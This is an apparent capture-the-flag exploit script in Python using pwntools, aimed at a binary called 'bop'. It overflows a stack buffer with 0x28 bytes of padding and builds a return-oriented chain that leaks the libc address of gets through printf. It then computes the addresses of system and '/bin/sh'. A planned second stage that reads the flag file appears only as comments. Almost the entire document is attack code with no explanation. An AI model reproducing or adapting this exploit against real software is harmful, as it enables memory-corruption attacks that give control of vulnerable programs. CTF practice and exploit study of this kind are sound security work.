#!/usr/bin/env python3 
main_addr = 0x0000000000401341 # 'Do you bop? ',0 | return in here
printf_offset = 0x61c90
system_offset = 0x52290
binsh_offset = 0x1b45bd
gets_offset = 0x83970

printf_plt = 0x4010f0
printf_got = 0x404038
gets_plt = 0x401100
gets_got = 0x404040

leave_ret = 0x00000000004012f7 			# : leave ; ret
prsi_r15_ret = 0x00000000004013d1 		# : pop rsi ; pop r15 ; ret
prdi_ret = 0x00000000004013d3 			# : pop rdi ; ret
ret = 0x000000000040101a 				# : ret

bss = 0x404500

from pwn import *

elf = ELF('./bop')
p = elf.process()

#p = remote('mc.ax', '30284')
gdb.attach(p, '''
	b *0x00000000004012F9
''')
# 1

pl1 = b'A' * 0x28
pl1 += p64(ret)
pl1 += p64(prdi_ret)
pl1 += p64(gets_got)
pl1 += p64(printf_plt)
pl1 += p64(ret)
pl1 += p64(main_addr)

p.recvuntil(b'bop? ')
p.sendline(pl1)

leak = p.recv(8).ljust(8, b'\x00')
gets_addr = u64(leak)
print(hex(gets_addr))
libc_base = gets_addr - gets_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset


#2
# open('./app/flag.txt')
# read(flagfd, bss, len)
# write(stdout, bss, len)




p.interactive()
